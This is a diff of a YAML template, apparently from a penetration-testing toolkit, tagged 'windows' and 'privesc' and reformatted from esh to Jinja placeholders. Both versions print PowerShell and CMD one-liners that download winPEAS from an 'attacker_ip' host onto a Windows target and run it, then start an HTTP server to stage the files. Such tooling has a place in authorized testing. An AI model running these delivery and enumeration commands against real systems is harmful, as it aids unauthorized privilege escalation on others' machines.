@@ -1,21 +1,25 @@
----
 metadata:
-  filename: "deliver-windows-winPEAS.yaml"
-  tags: ["windows", "privesc"]
-  created: "2025-03-29"
-  author: "Unknown"
-
-content: |
-  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/winpeas/* packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver only (x64): iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/winPEASx64.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe'; \
-  echo 'Deliver only (x86): iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/winPEASx86.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe'; \
-  echo 'Execute only: <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe cmd'; \
-  echo 'Execute and Save to file: <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe cmd > <%=$(esh variables/delivery_path_windows)%>\report.txt'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo 'Deliver only (x64): powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/winPEASx64.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe'; \
-  echo 'Deliver only (x86): powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/winPEASx86.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\winPEAS.exe'; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: deliver-windows-winPEAS.yaml
+  tags:
+  - windows
+  - privesc
+  created: '2025-03-29'
+  author: Unknown
+content: "mkdir -p packstation/outbound; cp -n {{ tools_dir }}/winpeas/* packstation/outbound;\
+  \ \\\necho '================================================================'; \\\
+  \necho '                      -----PowerShell-----                      '; \\\n\
+  echo 'Deliver only (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/winPEASx64.exe -Outfile {{ delivery_path_windows }}\\winPEAS.exe'; \\\necho\
+  \ 'Deliver only (x86): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/winPEASx86.exe -Outfile {{ delivery_path_windows }}\\winPEAS.exe'; \\\necho\
+  \ 'Execute only: {{ delivery_path_windows }}\\winPEAS.exe cmd'; \\\necho 'Execute\
+  \ and Save to file: {{ delivery_path_windows }}\\winPEAS.exe cmd > {{ delivery_path_windows\
+  \ }}\\report.txt'; \\\necho '================================================================';\
+  \ \\\necho '                         -----CMD-----                          '; \\\
+  \necho 'Deliver only (x64): powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/winPEASx64.exe -Outfile {{ delivery_path_windows }}\\winPEAS.exe'; \\\necho\
+  \ 'Deliver only (x86): powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/winPEASx86.exe -Outfile {{ delivery_path_windows }}\\winPEAS.exe'; \\\necho\
+  \ '================================================================'; \\\n python\
+  \ {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port\
+  \ }} -d packstation/outbound\n"
